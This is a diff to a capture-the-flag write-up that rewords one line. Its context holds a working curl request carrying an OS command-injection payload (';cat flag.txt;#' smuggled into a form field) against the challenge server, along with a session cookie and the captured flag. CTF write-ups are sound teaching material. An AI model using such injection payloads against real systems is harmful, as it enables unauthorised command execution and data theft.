@@ -136,7 +136,7 @@ set-cookie: access_token=ImFjY2Vzc19ncmFudGVkIg.Zts6gg.PLMJ0Id-S1aNwWIUea7HZ7pov
 ...
 ```
 
-Took the `access_token` cookie and send a POST request to `/feature` with our payload for the exploitation of OS Command injection: <br>
+Use the `access_token` to send a POST request to `/feature` with our payload for the exploitation of OS Command injection: <br>
 `curl -X POST https://feature-unlocked-web-challs.csc.tf/feature -d "text=;cat+flag.txt;#" -b "access_token=ImFjY2Vzc19ncmFudGVkIg.Zts_cw.zHs2yfq0altGN1yBnRKLcUzK1S0"` <br>
 
 Flag: `CSCTF{d1d_y0u_71m3_7r4v3l_f0r_7h15_fl46?!}`
